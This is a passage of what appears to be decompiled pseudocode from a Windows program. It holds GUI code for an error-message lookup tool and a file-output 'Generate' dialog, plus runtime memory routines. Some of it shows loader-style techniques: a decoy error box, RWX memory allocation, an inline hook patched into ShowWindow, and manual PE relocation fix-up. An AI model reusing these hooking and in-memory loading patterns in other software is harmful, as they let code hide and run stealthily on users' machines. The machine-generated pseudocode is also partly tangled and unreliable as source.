        && CoCreateInstance(&rclsid, 0, 1u, &riid, &ppv) >= 0
        && (*(int (__stdcall **)(LPVOID, const wchar_t *))(*(_DWORD *)ppv + 80))(ppv, L"main.lnk") >= 0
        && (**(int (__stdcall ***)(LPVOID, void *, HANDLE *))ppv)(ppv, &unk_4201B8, &v31) >= 0 )
      {
        (*(void (__stdcall **)(HANDLE, const wchar_t *, _DWORD))(*(_DWORD *)v31 + 24))(v31, L"temp", 0);
        (*(void (__stdcall **)(HANDLE))(*(_DWORD *)v31 + 8))(v31);
        (*(void (__stdcall **)(LPVOID))(*(_DWORD *)ppv + 8))(ppv);
        CoUninitialize();
      }
      MessageBoxA(0, "Unknown Error Detected", "Error", 0);
      WndClass.lpfnWndProc = 0;
      WndClass.cbClsExtra = 0;
      WndClass.cbWndExtra = 0;
      WndClass.hInstance = 0;
      WndClass.hIcon = 0;
      WndClass.hCursor = 0;
      WndClass.hbrBackground = 0;
      WndClass.lpszMenuName = 0;
      WndClass.lpszClassName = 0;
      WndClass.style = 3;
      WndClass.hCursor = LoadCursorA(0, (LPCSTR)0x7F00);
      WndClass.hInstance = hInstance;
      WndClass.lpfnWndProc = sub_410790;
      WndClass.lpszClassName = "Hint";
      RegisterClassA(&WndClass);
      v8 = CreateWindowExA(
             0,
             WndClass.lpszClassName,
             "Member Ownership",
             0x80000000,
             100,
             60,
             500,
             480,
             0,
             0,
             hInstance,
             0);
      ::ShowWindow(v8, 5);
      UpdateWindow(v8);
      MessageBoxA(0, asc_430000, "info", 0);
      while ( GetMessageA(&Msg, 0, 0, 0) )
      {
        TranslateMessage(&Msg);
        DispatchMessageA(&Msg);
      }
    }
    v31 = VirtualAlloc(0, 0x1000u, 0x3000u, 0x40u);
    if ( !v31 )
    {
      v9 = GetForegroundWindow();
      dword_435468 = (int)CreateSolidBrush(0x64FF64u);
      hbr = CreateSolidBrush(0x6464FFu);
      memset(Buttons, 0, sizeof(Buttons));
      for ( i = 0; i < 3; ++i )
      {
        if ( i )
        {
          if ( i == 1 )
            Buttons[1].idCommand = 2;
          else
            Buttons[2].idCommand = 3;
        }
        else
        {
          Buttons[0].idCommand = 1;
        }
        v11 = i;
        Buttons[v11].fsState = 4;
        Buttons[v11].iBitmap = i;
      }
      CreateToolbarEx(v9, 0x50800000u, 0xFFFFFFFF, 3, hBMInst, 2u, Buttons, 3, 16, 16, 16, 16, 0x14u);
      if ( !v31 )
      {
        v12 = GetForegroundWindow();
        v13 = CreatePopupMenu();
        AppendMenuA(v13, 0, 1u, "Красный фон");
        AppendMenuA(v13, 0, 2u, "Зеленый фон");
        AppendMenuA(v13, 0x800u, 0, 0);
        AppendMenuA(v13, 0, 3u, "Выход");
        GetWindowRect(v12, &Rect);
        TrackPopupMenu(v13, 0, x, y, 0, v12, 0);
        v5 = hInstance;
      }
    }
    Sleep(0x50u);
    sub_410120();
    strcpy(ClassName, "kenf_u");
    memset(&v24.style, 0, 0x2Cu);
    v24.cbSize = 48;
    v24.lpfnWndProc = sub_411070;
    v24.hInstance = v5;
    v24.hIcon = (HICON)LoadImageA(0, (LPCSTR)0x7F04, 1u, 0, 0, 0x8000u);
    v24.hCursor = (HCURSOR)LoadImageA(0, (LPCSTR)0x7F00, 2u, 0, 0, 0x8000u);
    v24.hbrBackground = (HBRUSH)16;
    v24.lpszClassName = ClassName;
    if ( !RegisterClassExA(&v24) )
    {
      MessageBoxA(0, "Wnd registration failure", "Error", 0x10u);
      return 0;
    }
    v14 = CreateWindowExA(0, ClassName, "Error Tool", 0xCA0000u, 0, 0, 278, 178, 0, 0, v5, 0);
    if ( v14 )
    {
      sub_411340(v14);
      v15 = GetModuleHandleA("user32");
      ShowWindow = (BOOL (__stdcall *)(HWND, int))GetProcAddress(v15, "ShowWindow");
      dword_435494 = (int)ShowWindow;
      if ( ShowWindow )
      {
        dword_43548C = *(_DWORD *)ShowWindow;
        word_435490 = *((_WORD *)ShowWindow + 2);
      }
      VirtualProtect(ShowWindow, 6u, 0x40u, &flOldProtect);
      v17 = dword_435494;
      *(_BYTE *)dword_435494 = 104;
      *(_DWORD *)(v17 + 1) = sub_4100F0;
      *(_BYTE *)(v17 + 5) = -61;
      ::ShowWindow(v14, nCmdShow);
      UpdateWindow(v14);
      if ( dword_43400C )
      {
        DestroyWindow(v14);
        sub_410120();
      }
      while ( GetMessageA(&v25, 0, 0, 0) > 0 )
      {
        v18 = (HACCEL)GetWindowLongA(v14, -21);
        if ( !TranslateAcceleratorA(v14, v18, &v25) && !IsDialogMessageA(v14, &v25) )
        {
          TranslateMessage(&v25);
          DispatchMessageA(&v25);
        }
      }
      return v25.wParam;
    }
    MessageBoxA(0, "Wnd creation failure", "Error", 0x10u);
    return 0;
  }
  while ( GetMessageA(&v28, 0, 0, 0) )
  {
    TranslateMessage(&v28);
    DispatchMessageA(&v28);
  }
  CloseHandle(0);
  return v28.wParam;
}
// 410CCB: conditional instruction was optimized away because of 'eax.4==2'
// 420278: using guessed type wchar_t aTemp[5];
// 420284: using guessed type wchar_t aMainLnk[9];
// 43400C: using guessed type int dword_43400C;
// 435458: using guessed type int dword_435458;
// 43545C: using guessed type int dword_43545C;
// 435460: using guessed type int dword_435460;
// 435464: using guessed type int dword_435464;
// 435468: using guessed type int dword_435468;
// 43548C: using guessed type int dword_43548C;
// 435490: using guessed type __int16 word_435490;
// 435494: using guessed type int dword_435494;

//----- (00411070) --------------------------------------------------------
LRESULT __stdcall sub_411070(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
  HACCEL v4; // eax
  HACCEL v6; // eax
  HMODULE v7; // eax
  HMODULE v8; // eax
  HMODULE v9; // eax
  HMODULE v10; // eax
  HMODULE v11; // eax
  DWORD v12; // eax
  HWND v13; // esi
  struct tagACCEL paccel; // [esp+4h] [ebp-8h] BYREF

  if ( Msg <= 0x111 )
  {
    if ( Msg != 273 )
    {
      if ( Msg == 1 )
      {
        paccel.fVirt = 1;
        *(_DWORD *)&paccel.key = -1673527184;
        v6 = CreateAcceleratorTableA(&paccel, 1);
        SetWindowLongA(hWnd, -21, (LONG)v6);
        sub_411300(hWnd);
        v7 = GetModuleHandleA(0);
        ::hWnd = CreateWindowExA(0x200u, "edit", "0", 0x50012000u, 56, 8, 138, 28, hWnd, (HMENU)0x64, v7, 0);
        SendMessageA(::hWnd, 0xC5u, 5u, 0);
        v8 = GetModuleHandleA(0);
        CreateWindowExA(0, "static", "Value:", 0x50000200u, 8, 8, 48, 28, hWnd, (HMENU)0xFFFFFFFF, v8, 0);
        v9 = GetModuleHandleA(0);
        dword_4354B4 = (int)CreateWindowExA(0, "button", "Show", 0x50010000u, 208, 8, 56, 28, hWnd, (HMENU)0x65, v9, 0);
        v10 = GetModuleHandleA(0);
        CreateWindowExA(0, "static", "Message:", 0x50000200u, 8, 42, 48, 28, hWnd, (HMENU)0xFFFFFFFF, v10, 0);
        v11 = GetModuleHandleA(0);
        dword_4354B0 = CreateWindowExA(0x200u, "edit", 0, 0x50010804u, 8, 70, 256, 68, hWnd, (HMENU)0x64, v11, 0);
        EnumChildWindows(hWnd, EnumFunc, 0);
        SetFocus(::hWnd);
        SendMessageA(::hWnd, 0xB1u, 0, -1);
        return 0;
      }
      if ( Msg == 2 )
      {
        v4 = (HACCEL)GetWindowLongA(hWnd, -21);
        DestroyAcceleratorTable(v4);
        PostQuitMessage(0);
        return 0;
      }
      return DefWindowProcA(hWnd, Msg, wParam, lParam);
    }
    if ( !HIWORD(wParam) )
    {
      switch ( (unsigned __int16)wParam )
      {
        case 1u:
          goto LABEL_11;
        case 2u:
          DestroyWindow(hWnd);
          return 0;
        case 0x65u:
LABEL_11:
          v12 = GetDlgItemInt(hWnd, 100, 0, 0);
          sub_4114D0(v12);
          return 0;
      }
    }
    return 0;
  }
  if ( Msg != 274 )
    return DefWindowProcA(hWnd, Msg, wParam, lParam);
  if ( wParam == 40000 )
  {
    v13 = GetFocus();
    MessageBoxA(hWnd, "F1", "F2", 0);
    SetFocus(v13);
    return 0;
  }
  if ( wParam != 40001 )
    return DefWindowProcA(hWnd, 0x112u, wParam, lParam);
  sub_4113E0(hWnd);
  return 0;
}
// 4354B4: using guessed type int dword_4354B4;

//----- (00411300) --------------------------------------------------------
BOOL __usercall sub_411300@<eax>(HWND a1@<eax>)
{
  HMENU v1; // esi

  v1 = GetSystemMenu(a1, 0);
  AppendMenuA(v1, 0x800u, 0, 0);
  AppendMenuA(v1, 0, 0x9C40u, "Help...");
  return AppendMenuA(v1, 0, 0x9C41u, "About...");
}

//----- (00411340) --------------------------------------------------------
BOOL __usercall sub_411340@<eax>(HWND a1@<esi>)
{
  char pvParam[8]; // [esp+8h] [ebp-20h] BYREF
  int v3; // [esp+10h] [ebp-18h]
  int v4; // [esp+14h] [ebp-14h]
  struct tagRECT Rect; // [esp+18h] [ebp-10h] BYREF

  SystemParametersInfoA(0x30u, 0, pvParam, 0);
  GetWindowRect(a1, &Rect);
  return MoveWindow(
           a1,
           (Rect.left + v3 - Rect.right) / 2,
           (Rect.top + v4 - Rect.bottom) / 2,
           Rect.right - Rect.left,
           Rect.bottom - Rect.top,
           0);
}

//----- (004113B0) --------------------------------------------------------
BOOL __stdcall EnumFunc(HWND hWnd, LPARAM a2)
{
  HGDIOBJ v2; // eax

  v2 = GetStockObject(17);
  SendMessageA(hWnd, 0x30u, (WPARAM)v2, 1);
  return 1;
}

//----- (004113E0) --------------------------------------------------------
HWND __usercall sub_4113E0@<eax>(HWND a1@<eax>)
{
  int v2; // esi
  int v3; // edi
  HANDLE v4; // eax
  CHAR *v5; // eax
  CHAR *v6; // esi
  int v7; // eax
  HWND v8; // edi
  HANDLE v9; // eax
  MSGBOXPARAMSA mbp; // [esp+Ch] [ebp-30h] BYREF
  CHAR String[8]; // [esp+34h] [ebp-8h] BYREF

  strcpy(String, "About ");
  v2 = GetWindowTextLengthA(a1);
  v3 = v2 + lstrlenA(String) + 1;
  v4 = GetProcessHeap();
  v5 = (CHAR *)HeapAlloc(v4, 0, v3);
  v6 = v5;
  if ( v5 )
  {
    lstrcpyA(v5, String);
    v7 = lstrlenA(String);
    GetWindowTextA(a1, &v6[v7], v3);
  }
  mbp.hwndOwner = a1;
  v8 = GetFocus();
  mbp.cbSize = 40;
  mbp.hInstance = 0;
  mbp.lpszText = "Copyright (c) 2004\n";
  if ( v6 )
    mbp.lpszCaption = v6;
  else
    mbp.lpszCaption = String;
  mbp.dwStyle = 128;
  mbp.lpszIcon = (LPCSTR)32516;
  mbp.dwContextHelpId = 0;
  mbp.lpfnMsgBoxCallback = 0;
  mbp.dwLanguageId = 2057;
  MessageBoxIndirectA(&mbp);
  if ( v6 )
  {
    v9 = GetProcessHeap();
    HeapFree(v9, 0, v6);
  }
  return SetFocus(v8);
}

//----- (004114D0) --------------------------------------------------------
HWND __cdecl sub_4114D0(DWORD dwMessageId)
{
  HWND v1; // esi
  HWND v2; // edi
  CHAR Buffer[4]; // [esp+8h] [ebp-4h] BYREF

  v1 = dword_4354B0;
  v2 = GetFocus();
  if ( FormatMessageA(0x1100u, 0, dwMessageId, 0x400u, Buffer, 0, 0) )
  {
    SetWindowTextA(v1, *(LPCSTR *)Buffer);
    LocalFree(*(HLOCAL *)Buffer);
  }
  else
  {
    MessageBoxA(0, "There is no message,error code.", "Error", 0x30u);
  }
  return SetFocus(v2);
}

//----- (00411550) --------------------------------------------------------
int __cdecl sub_411550(int a1)
{
  int v1; // edx
  int v2; // esi
  int v4; // edx
  _DWORD *v5; // edx
  int v6; // eax
  unsigned int v7; // edi
  _WORD *v8; // esi
  int v9; // ecx
  int v10; // [esp+4h] [ebp-4h]

  v1 = *(_DWORD *)(a1 + 60);
  v2 = *(_DWORD *)(v1 + a1 + 52);
  if ( a1 == v2 )
    return 1;
  v4 = *(_DWORD *)(v1 + a1 + 160);
  v10 = a1 - v2;
  if ( !v4 )
    return 1;
  v5 = (_DWORD *)(a1 + v4);
  v6 = v5[1];
  if ( !v6 )
    return 1;
  while ( 1 )
  {
    v7 = 0;
    if ( (unsigned int)(v6 - 8) >> 1 )
      break;
LABEL_11:
    v5 = (_DWORD *)((char *)v5 + v5[1]);
    v6 = v5[1];
    if ( !v6 )
      return 1;
  }
  v8 = v5 + 2;
  while ( 1 )
  {
    v9 = *v8 >> 12;
    if ( (_WORD)v9 )
      break;
LABEL_10:
    ++v7;
    ++v8;
    if ( v7 >= (unsigned int)(v6 - 8) >> 1 )
      goto LABEL_11;
  }
  if ( v9 == 3 )
  {
    *(_DWORD *)(*v5 + (*v8 & 0xFFF) + a1) += v10;
    goto LABEL_10;
  }
  return 0;
}

//----- (00411600) --------------------------------------------------------
unsigned __int8 *__usercall sub_411600@<eax>(unsigned __int8 *a1@<eax>, int a2, LPCSTR lpString)
{
  unsigned __int8 *v3; // esi
  unsigned int v4; // eax
  LPCSTR v5; // edx
  unsigned int v6; // edi
  int v7; // ecx
  unsigned __int8 *v9; // [esp+Ch] [ebp-4h]

  v3 = a1;
  v9 = a1;
  v4 = lstrlenA(lpString);
  if ( a2 < v4 )
    return 0;
  while ( 1 )
  {
    v5 = lpString;
    v6 = v4;
    if ( v4 < 4 )
    {
LABEL_5:
      if ( !v6 )
        return v9;
    }
    else
    {
      while ( *(_DWORD *)v3 == *(_DWORD *)v5 )
      {
        v6 -= 4;
        v5 += 4;
        v3 += 4;
        if ( v6 < 4 )
          goto LABEL_5;
      }
    }
    v7 = *v3 - *(unsigned __int8 *)v5;
    if ( !v7 )
    {
      if ( v6 <= 1 )
        return v9;
      v7 = v3[1] - *((unsigned __int8 *)v5 + 1);
      if ( !v7 )
      {
        if ( v6 <= 2 )
          return v9;
        v7 = v3[2] - *((unsigned __int8 *)v5 + 2);
        if ( !v7 )
        {
          if ( v6 <= 3 )
            return v9;
          v7 = v3[3] - *((unsigned __int8 *)v5 + 3);
        }
      }
    }
    if ( !((v7 >> 31) | 1) )
      return v9;
    v3 = ++v9;
    if ( --a2 < v4 )
      return 0;
  }
}

//----- (004116B0) --------------------------------------------------------
BOOL __usercall sub_4116B0@<eax>(CHAR *a1@<esi>, char a2, const CHAR *a3, const CHAR *a4)
{
  BOOL result; // eax
  CHAR Buffer; // [esp+0h] [ebp-164h] BYREF
  char v6[259]; // [esp+1h] [ebp-163h] BYREF
  struct tagOFNA v7; // [esp+108h] [ebp-5Ch] BYREF

  Buffer = 0;
  memset(v6, 0, sizeof(v6));
  v7.lStructSize = 0;
  memset(&v7.hwndOwner, 0, 0x54u);
  GetCurrentDirectoryA(0x104u, &Buffer);
  v7.lStructSize = 88;
  v7.lpstrFile = a1;
  v7.hInstance = 0;
  *a1 = 0;
  v7.nMaxFile = 260;
  v7.lpstrInitialDir = &Buffer;
  v7.lpstrFilter = a3;
  v7.lpstrTitle = a4;
  v7.Flags = 6144;
  if ( a2 )
    result = GetOpenFileNameA(&v7);
  else
    result = GetSaveFileNameA(&v7);
  return result;
}

//----- (00411760) --------------------------------------------------------
int __usercall sub_411760@<eax>(const char *a1@<esi>, const char *a2)
{
  int v2; // ecx
  int v3; // edi
  int v4; // ecx
  bool v5; // zf
  int v7; // [esp+8h] [ebp-4h]

  v2 = 0;
  v3 = 0;
  v7 = 0;
  if ( (int)(strlen(a1) - 1) >= 0 )
  {
    while ( 1 )
    {
      if ( a1[strlen(a1) - v2 - 1] == 46 )
        v7 = v2 + 1;
      if ( a1[strlen(a1) - v2 - 1] == 92 )
        break;
      if ( ++v2 > (int)(strlen(a1) - 1) )
        goto LABEL_8;
    }
    v3 = v2;
  }
LABEL_8:
  v4 = 0;
  v5 = v3 == 0;
  if ( v3 > 0 )
  {
    do
    {
      if ( v4 == v7 )
        break;
      a2[v4] = a1[strlen(a1) - v3 + v4];
      ++v4;
    }
    while ( v4 < v3 );
    v5 = v3 == 0;
  }
  if ( v5 )
    *(_DWORD *)&a2[strlen(a2)] = 2764330;
  return 1;
}

//----- (00411820) --------------------------------------------------------
unsigned int __usercall sub_411820@<eax>(const char *a1@<ebx>, char *a2)
{
  int v2; // esi
  int v3; // edi
  unsigned int result; // eax
  unsigned int v5; // kr00_4
  unsigned int v6; // eax
  int i; // ecx

  v2 = 0;
  v3 = 0;
  result = strlen(a1);
  if ( result )
  {
    v5 = strlen(a1);
    v6 = v5 - 1;
    if ( v5 != 1 )
    {
      while ( a1[v6] != 46 )
      {
        ++v3;
        if ( !--v6 )
          goto LABEL_7;
      }
      v2 = v3;
    }
LABEL_7:
    for ( i = 0; i < v2; ++i )
      a2[i] = a1[strlen(a1) - v2 + i];
    if ( !strcmp((const char *)&unk_4203BF, a2) )
    {
      *(_DWORD *)a2 = 0;
      strcpy(a2, "unknown");
    }
    result = 1;
  }
  return result;
}

//----- (004118E0) --------------------------------------------------------
LRESULT __stdcall sub_4118E0(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
  LRESULT result; // eax
  HANDLE v5; // edi
  DWORD v6; // eax
  HWND v7; // esi
  HGDIOBJ v8; // eax
  DWORD FileSizeHigh; // [esp+Ch] [ebp-4h] BYREF

  switch ( Msg )
  {
    case 1u:
      CreateWindowExA(0, "Button", "Open", 0x50800000u, 8, 251, 149, 18, hWnd, (HMENU)0x3EF, 0, 0);
      CreateWindowExA(0, "Button", "Generate", 0x50800000u, 159, 251, 149, 18, hWnd, (HMENU)0x3ED, 0, 0);
      CreateWindowExA(0, "Button", "Close File", 0x50800000u, 8, 270, 149, 18, hWnd, (HMENU)0x3EB, 0, 0);
      CreateWindowExA(0, "Button", "Clear", 0x50800000u, 159, 270, 149, 18, hWnd, (HMENU)0x3EA, 0, 0);
      SendDlgItemMessageA(hWnd, 1007, 0x30u, ::wParam, 0);
      SendDlgItemMessageA(hWnd, 1003, 0x30u, ::wParam, 0);
      SendDlgItemMessageA(hWnd, 1002, 0x30u, ::wParam, 0);
      SendDlgItemMessageA(hWnd, 1005, 0x30u, ::wParam, 0);
      dword_4354A8 = CreateWindowExA(0, "ListBox", 0, 0x50A00000u, 8, 8, 300, 250, hWnd, (HMENU)0x3EE, 0, 0);
      v7 = dword_4354A8;
      v8 = GetStockObject(16);
      SendMessageA(v7, 0x30u, (WPARAM)v8, 1);
LABEL_38:
      sub_411FC0(dword_4354A8);
LABEL_39:
      result = 0;
      break;
    case 2u:
LABEL_6:
      PostQuitMessage(0);
      result = 0;
      break;
    case 0x111u:
      switch ( (__int16)wParam )
      {
        case 1001:
          MessageBoxA(hWnd, "Success", "Information", 0x40u);
          return 0;
        case 1002:
          SendMessageA(dword_4354A8, 0x184u, 0xFFFFFFFF, 0);
          sub_411FC0(dword_4354A8);
          return 0;
        case 1003:
          if ( !strcmp((const char *)&unk_4203BF, lpFileName) )
            goto LABEL_38;
          lpFileName = 0;
          dword_435458 = 0;
          dword_43545C = 0;
          dword_435460 = 0;
          dword_435464 = 0;
          sub_411FC0(dword_4354A8);
          return 0;
        case 1004:
          goto LABEL_6;
        case 1005:
          if ( !strcmp((const char *)&unk_4203BF, lpFileName) )
            goto LABEL_38;
          if ( strcmp((const char *)&unk_4203BF, (const char *)dword_435458) )
          {
            sub_411FC0(dword_4354A8);
            sub_411FC0(dword_4354A8);
            return 0;
          }
          sub_4116B0((CHAR *)dword_435458, 0, "*.*", "Select output-file");
          if ( !strcmp((const char *)&unk_4203BF, (const char *)dword_435458) )
            goto LABEL_38;
          if ( !dword_4354A4 )
          {
LABEL_11:
            sub_411FC0(dword_4354A8);
            return 0;
          }
          goto LABEL_39;
        case 1007:
          if ( strcmp((const char *)&unk_4203BF, lpFileName) )
            goto LABEL_11;
          sub_4116B0((CHAR *)lpFileName, 1, (const CHAR *)&dword_4203C0, "Select file");
          if ( !strcmp((const char *)&unk_4203BF, lpFileName) )
            goto LABEL_38;
          v5 = CreateFileA(lpFileName, 0x80000000, 1u, 0, 3u, 0x80u, 0);
          if ( v5 == (HANDLE)-1 )
          {
            sub_411FC0(dword_4354A8);
            result = 0;
            lpFileName = 0;
            dword_435458 = 0;
            dword_43545C = 0;
            dword_435460 = 0;
            dword_435464 = 0;
            return result;
          }
          if ( sub_411760(lpFileName, (const char *)dword_43545C) == 1 )
          {
            sub_411FC0(dword_4354A8);
          }
          else
          {
            sub_411FC0(dword_4354A8);
            lpFileName = 0;
            dword_435458 = 0;
            dword_43545C = 0;
            dword_435460 = 0;
            dword_435464 = 0;
            sub_411FC0(dword_4354A8);
          }
          if ( sub_411820(lpFileName, (char *)dword_435460) == 1 )
          {
            sub_411FC0(dword_4354A8);
          }
          else
          {
            sub_411FC0(dword_4354A8);
            lpFileName = 0;
            dword_435458 = 0;
            dword_43545C = 0;
            dword_435460 = 0;
            dword_435464 = 0;
            sub_411FC0(dword_4354A8);
          }
          FileSizeHigh = 0;
          v6 = GetFileSize(v5, &FileSizeHigh);
          dword_435464 = v6;
          if ( !v6 )
          {
            sub_411FC0(dword_4354A8);
            lpFileName = 0;
            dword_435458 = 0;
            dword_43545C = 0;
            dword_435460 = 0;
            dword_435464 = 0;
            sub_411FC0(dword_4354A8);
            CloseHandle(v5);
            return 0;
          }
          if ( v6 < 0x3E8 )
            goto LABEL_28;
          if ( v6 - 1001 > 0xF3E56 )
          {
            if ( v6 > 0xF4240 )
            {
              dword_435464 = v6 / 0xF4240;
LABEL_28:
              sub_411FC0(dword_4354A8);
            }
            CloseHandle(v5);
            result = 0;
          }
          else
          {
            dword_435464 = v6 / 0x3E8;
            sub_411FC0(dword_4354A8);
            CloseHandle(v5);
            result = 0;
          }
          break;
        default:
          goto LABEL_39;
      }
      break;
    default:
      result = DefWindowProcA(hWnd, Msg, wParam, lParam);
      break;
  }
  return result;
}
// 411C54: conditional instruction was optimized away because of 'eax.4 in (1..3E7)'
// 4203C0: using guessed type int dword_4203C0;
// 435458: using guessed type int dword_435458;
// 43545C: using guessed type int dword_43545C;
// 435460: using guessed type int dword_435460;
// 435464: using guessed type int dword_435464;
// 4354A4: using guessed type int dword_4354A4;

//----- (00411FC0) --------------------------------------------------------
LRESULT __cdecl sub_411FC0(HWND hWnd)
{
  _BYTE lParam[1024]; // [esp+0h] [ebp-400h] BYREF

  lParam[0] = 0;
  memset(&lParam[1], 0, 0x3FFu);
  return SendMessageA(hWnd, 0x181u, 0xFFFFFFFF, (LPARAM)lParam);
}

//----- (00412010) --------------------------------------------------------
// 109
void *__cdecl memset(void *a1, int Val, size_t Size)
{
  size_t v3; // edx
  _BYTE *v4; // ecx
  int v5; // eax
  _BYTE *v6; // edi
  int v7; // ecx
  size_t v8; // ecx
  unsigned int v9; // ecx
  void *result; // eax
  int v11; // eax
  size_t v12; // eax
  unsigned int v13; // edx
  size_t j; // eax
  unsigned int k; // eax
  unsigned int v16; // edx
  char v17; // al
  unsigned int l; // edx
  int m; // eax
  int v20; // edx
  unsigned int i; // ebx

  v3 = Size;
  v4 = a1;
  if ( !Size )
    return a1;
  LOBYTE(v5) = Val;
  if ( !(_BYTE)Val && Size >= 0x80 && dword_435874 )
  {
    v11 = (unsigned __int8)a1 & 0xF;
    if ( ((unsigned __int8)a1 & 0xF) != 0 )
    {
      v20 = (16 - (_BYTE)v11) & 3;
      if ( ((16 - (_BYTE)v11) & 3) != 0 )
      {
        do
        {
          *v4++ = 0;
          --v20;
        }
        while ( v20 );
      }
      for ( i = (unsigned int)(16 - v11) >> 2; i; --i )
      {
        *(_DWORD *)v4 = 0;
        v4 += 4;
      }
      v3 = Size - (16 - v11);
    }
    v12 = v3;
    v13 = v3 & 0x7F;
    for ( j = v12 >> 7; j; --j )
    {
      *(_OWORD *)v4 = 0i64;
      *((_OWORD *)v4 + 1) = 0i64;
      *((_OWORD *)v4 + 2) = 0i64;
      *((_OWORD *)v4 + 3) = 0i64;
      *((_OWORD *)v4 + 4) = 0i64;
      *((_OWORD *)v4 + 5) = 0i64;
      *((_OWORD *)v4 + 6) = 0i64;
      *((_OWORD *)v4 + 7) = 0i64;
      v4 += 128;
    }
    if ( v13 )
    {
      for ( k = v13 >> 4; k; --k )
      {
        *(_OWORD *)v4 = 0i64;
        v4 += 16;
      }
      v16 = v13 & 0xF;
      if ( v16 )
      {
        v17 = v16;
        for ( l = v16 >> 2; l; --l )
        {
          *(_DWORD *)v4 = 0;
          v4 += 4;
        }
        for ( m = v17 & 3; m; --m )
          *v4++ = 0;
      }
    }
    result = a1;
  }
  else
  {
    v6 = a1;
    if ( Size < 4 )
      goto LABEL_33;
    v7 = -(int)a1 & 3;
    if ( v7 )
    {
      v3 = Size - v7;
      do
      {
        *v6++ = Val;
        --v7;
      }
      while ( v7 );
    }
    v5 = 16843009 * (unsigned __int8)Val;
    v8 = v3;
    v3 &= 3u;
    v9 = v8 >> 2;
    if ( !v9 || (memset32(v6, v5, v9), v6 += 4 * v9, v3) )
    {
LABEL_33:
      do
      {
        *v6++ = v5;
        --v3;
      }
      while ( v3 );
    }
    result = a1;
  }
  return result;
}
// 435874: using guessed type int dword_435874;

//----- (00412090) --------------------------------------------------------
unsigned int __cdecl sub_412090(unsigned int a1, const __m128i *a2, unsigned int a3)
{
  const __m128i *v3; // esi
  unsigned int v4; // ecx
  __m128i *v5; // edi
  unsigned int v6; // ecx
  unsigned int result; // eax
  int v8; // esi
  int v9; // edi
  unsigned int v10; // ecx
  int v11; // eax
  unsigned int v12; // edx
  unsigned int v13; // ecx
  unsigned int j; // edx
  __m128i v15; // xmm1
  __m128i v16; // xmm2
  __m128i v17; // xmm3
  __m128i v18; // xmm5
  __m128i v19; // xmm6
  __m128i v20; // xmm7
  unsigned int k; // edx
  unsigned int v22; // ecx
  char v23; // al
  unsigned int l; // ecx
  int v25; // ecx
  unsigned int v26; // eax
  int v27; // ecx
  unsigned int i; // eax
  unsigned int v29; // [esp-8h] [ebp-10h]

  v3 = a2;
  v4 = a3;
  v5 = (__m128i *)a1;
  if ( a1 > (unsigned int)a2 && a1 < (unsigned int)a2->m128i_u32 + a3 )
  {
    v8 = (int)&a2->m128i_i32[-1] + a3;
    v9 = a3 + a1 - 4;
    if ( (v9 & 3) == 0 )
    {
      v10 = a3 >> 2;
      if ( a3 >> 2 >= 8 )
      {
        while ( v10 )
        {
          *(_DWORD *)v9 = *(_DWORD *)v8;
          v8 -= 4;
          v9 -= 4;
          --v10;
        }
        switch ( a3 & 3 )
        {
          case 0u:
            goto LABEL_35;
          case 1u:
            goto LABEL_36;
          case 2u:
            goto LABEL_37;
          case 3u:
            goto LABEL_38;
        }
      }
      switch ( a3 & 3 )
      {
        case 0u:
          goto LABEL_35;
        case 1u:
          goto LABEL_36;
        case 2u:
          goto LABEL_37;
        case 3u:
          goto LABEL_38;
      }
    }
    switch ( a3 )
    {
      case 0u:
LABEL_35:
        result = a1;
        break;
      case 1u:
LABEL_36:
        *(_BYTE *)(v9 + 3) = *(_BYTE *)(v8 + 3);
        result = a1;
        break;
      case 2u:
LABEL_37:
        *(_BYTE *)(v9 + 3) = *(_BYTE *)(v8 + 3);
        *(_BYTE *)(v9 + 2) = *(_BYTE *)(v8 + 2);
        result = a1;
        break;
      case 3u:
LABEL_38:
        *(_BYTE *)(v9 + 3) = *(_BYTE *)(v8 + 3);
        *(_BYTE *)(v9 + 2) = *(_BYTE *)(v8 + 2);
        *(_BYTE *)(v9 + 1) = *(_BYTE *)(v8 + 1);
        result = a1;
        break;
      default:
        __asm { jmp     dword ptr ds:loc_41229C+4[eax*4] }
        return result;
    }
  }
  else if ( a3 >= 0x80 && dword_435874 && (v3 = a2, v5 = (__m128i *)a1, (a1 & 0xF) == ((unsigned __int8)a2 & 0xF)) )
  {
    v11 = (unsigned __int8)a2 & 0xF;
    if ( ((unsigned __int8)a2 & 0xF) != 0 )
    {
      v29 = a3 - (16 - v11);
      v26 = 16 - v11;
      v27 = v26 & 3;
      if ( (v26 & 3) != 0 )
      {
        do
        {
          v5->m128i_i8[0] = v3->m128i_i8[0];
          v3 = (const __m128i *)((char *)v3 + 1);
          v5 = (__m128i *)((char *)v5 + 1);
          --v27;
        }
        while ( v27 );
      }
      for ( i = v26 >> 2; i; --i )
      {
        v5->m128i_i32[0] = v3->m128i_i32[0];
        v3 = (const __m128i *)((char *)v3 + 4);
        v5 = (__m128i *)((char *)v5 + 4);
      }
      v4 = v29;
    }
    v12 = v4;
    v13 = v4 & 0x7F;
    for ( j = v12 >> 7; j; --j )
    {
      v15 = _mm_load_si128(v3 + 1);
      v16 = _mm_load_si128(v3 + 2);
      v17 = _mm_load_si128(v3 + 3);
      *v5 = _mm_load_si128(v3);
      v5[1] = v15;
      v5[2] = v16;
      v5[3] = v17;
      v18 = _mm_load_si128(v3 + 5);
      v19 = _mm_load_si128(v3 + 6);
      v20 = _mm_load_si128(v3 + 7);
      v5[4] = _mm_load_si128(v3 + 4);
      v5[5] = v18;
      v5[6] = v19;
      v5[7] = v20;
      v3 += 8;
      v5 += 8;
    }
    if ( v13 )
    {
      for ( k = v13 >> 4; k; --k )
        *v5++ = _mm_load_si128(v3++);
      v22 = v13 & 0xF;
      if ( v22 )
      {
        v23 = v22;
        for ( l = v22 >> 2; l; --l )
        {
          v5->m128i_i32[0] = v3->m128i_i32[0];
          v3 = (const __m128i *)((char *)v3 + 4);
          v5 = (__m128i *)((char *)v5 + 4);
        }
        v25 = v23 & 3;
        if ( (v23 & 3) != 0 )
        {
          do
          {
            v5->m128i_i8[0] = v3->m128i_i8[0];
            v3 = (const __m128i *)((char *)v3 + 1);
            v5 = (__m128i *)((char *)v5 + 1);
            --v25;
          }
          while ( v25 );
        }
      }
    }
    result = a1;
  }
  else
  {
    if ( ((unsigned __int8)v5 & 3) != 0 )
    {
      if ( a3 >= 4 )
        __asm { jmp     dword ptr ds:loc_412110+4[eax*4] }
      __asm { jmp     dword ptr ds:loc_412210[ecx*4]; jumptable 004120E9 case 0 }
    }
